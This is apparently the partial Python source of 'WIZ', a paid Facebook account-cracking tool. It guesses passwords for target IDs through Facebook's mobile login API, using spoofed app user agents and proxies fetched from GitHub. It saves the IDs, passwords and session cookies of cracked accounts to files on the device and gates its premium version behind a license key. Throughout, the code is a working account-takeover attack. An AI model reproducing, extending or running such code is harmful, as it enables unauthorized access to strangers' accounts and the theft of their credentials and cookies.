...
try:
    prox= requests.get('https://raw.githubusercontent.com/WIZt2/M01/main/.prox.txt').text
...
print('\033[1;37m[\033[1;32m=\033[1;37m] \033[1;32mWELLCOM TO WIZ OUSSAMA TOOL ...')
os.system("espeak -a 300 \"WELLCOM, TO, WIZ,  OUSSAMA,  TOOL,\"")
...
#os.system('xdg-open https://www.youtube.com/@WIZINITY16747')
sys.stdout.write('\x1b]2; <[WIZARD]>\x07')
logo=(f"""\033[1;37m
...
def menu():
                     ...
                     #print('\033[1;37m[\033[1;32m6\033[1;37m] \033[1;37mFOLLOW FB')
                        ...
                        if xd in ['1','01']:
                            ...
                            # os.system('xdg-open https://t.me/WIZINITY01000')
                                menu()
                        elif xd in ['6','06']:
...
def M1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m<[WIZARD-M1]>×<[%s| \033[1;32mOK\033[1;37m|\033[1;34mCP \033[1;32m%s\033[1;37m|\033[1;34m%s\033[1;37m]> '%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/115.70.5.10;FBBV/58636135;FBDM/{density=3.6,width=816,height=2030};FBLC/en_US;FBRV/35333459;FBCR/null;FBMF/lge;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGE;FBSV/7.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FB4A/;FBAV/YZWSES93;FBBV/296711892;FBAN/FB4A;FBAV/YZWSES93;FBBV/296711892;FBDM//*{density=3.0,width=2560,height=1920};FBLC/de_DE;FBRV/648161967;FBCR/Realme;FBMF/Motorola;FBBD/Vivo;FBPN/com.facebook.katana;FBDV/Vivo_Y110s;FBSV/11;FBOP/8;FBCA/armeabi-v7a;FBSS/18;]"+"[FBAN/FB4A;FBAV/116.0.0.23.116;FBBV/510752865;FBDM/{density=3.5,width=953,height=1707};FBLC/en_GB;FBCR/UFONE-PAKTel;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/Huawei P10;FBSV/10.2.2;nullFBCA/arm64-v8a;]"
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m<[WIZ-OK]> '+ids+' | '+pas+'\033[1;97m')
                                        #------[OK IDS]------#
                                        #print("\033[1;33m <[BISCUT-🍪]> :\033[1;33m "+cookie)                                                   
                                        open('/sdcard/WIZ_m1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/WIZ_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        oks.append(ids)
                                        Elite(ids,pas,ckkk)
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m<[WIZ-CP]> '+ids+' | '+pas+'\033[1;97m')
...
def M2(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m<[WIZ-M2]>×<[%s| \033[1;32mOK\033[1;37m|\033[1;34mCP \033[1;32m%s\033[1;37m|\033[1;34m%s\033[1;37m]> '%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/226.0.0.192;FBBV/561248149;FBDM/{density=2.7478256466602557,width=999,height=1933};FBLC/en_US;FBRV/956750042;FBCR/Indosat Ooredoo;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.lite;FBDV/Oppo Reno 2;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                ...
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m<[WIZ-OK]> '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m')
                                        os.system("espeak -a 300 \"WIZ,  OK,  OUSSAMA,  THANKS,  \"") 
                                        print("\033[1;34m <[BISCUT-🍪]> :\033[1;37m "+cookie)           
                                        open('/sdcard/WIZ_m2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/WIZ_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                        
                                        oks.append(ids)
                                        Elite(ids,pas,ckkk)
                                        break
...
def M3(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m<[WIZ-M3]>×<[%s| \033[1;32mOK\033[1;37m|\033[1;34mCP \033[1;32m%s\033[1;37m|\033[1;34m%s\033[1;37m]> '%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m <[WIZ-OK]> '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m')                 
                                        #print("\033[1;33m [BISCUT-🍪] :\033[1;33m "+cookie)                                                   
                                        open('/sdcard/WIZ_m1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/WIZ_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                      
                                        oks.append(ids)
                                        Elite(ids,pas,ckkk)                           
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
...
def M4(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m<[WIZ-M4]>×<[%s| \033[1;32mOK\033[1;37m|\033[1;34mCP \033[1;32m%s\033[1;37m|\033[1;34m%s\033[1;37m]> '%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m<[WIZ-OK]> '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m')                 
                                       # print("\033[1;33m<[BISCUT-🍪]> :\033[1;33m "+cookie)                                                   
                                        open('/sdcard/WIZ_m4_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/WIZ_iDs_COOKiE_M4.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        oks.append(ids)
                                        Elite(ids,pas,ckkk)
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
...
def main_apv():
    ...
    print(logo)
    uuid = str(os.geteuid())
    Xyteee=('WIZx6b7b5c%s85b8n9nfdi%s'%(uuid,uuid))
    print(logo)
    os.system("clear");print(logo)
    print(f" Your Key : \x1b[1;31m"+Xyteee)
    print('\033[1;34m═════════════════════════════════════════')
    try:
        system = requests.get("https://WIZ166.blogspot.com/2024/03/m1.html").text 
        if Xyteee in system:
            print()
            msg = str(os.geteuid()) 
            time.sleep(1) 
            ...
            print('\033[1;32m[\033[1;31m-\033[1;32m] \033[1;37m Notes : WIZ Tools Can buy in all countries!')
            print('\033[1;34m═════════════════════════════════════════\033[1;97m')
            ...
            tks = ("Hi WIZ Sir, I Need To Buy Your WIZ Tools Version 4.22 Premium Please Accept My Key To Premium\n\n Name : "+choice+"\n Key : "+Xyteee+"\n Buy Select : "+Picchi)
